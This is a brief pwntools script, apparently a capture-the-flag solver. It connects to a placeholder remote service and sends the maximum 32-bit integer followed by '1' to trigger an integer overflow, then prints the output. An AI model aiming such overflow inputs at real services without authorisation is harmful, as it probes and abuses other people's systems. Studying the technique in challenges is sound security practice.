from pwn import *

host = 'HOST_HERE'
port = PORT_HERE

connect = remote(host,port)

payload = '2147483647' #Maxmimum integer value
connect.sendlineafter('\n', payload) #Sends number
payload1 = '1' #To overflow
connect.sendlineafter('\n', payload1) #Sends "1" to overflow

output = connect.recvall()

print("")
print(output[72:])
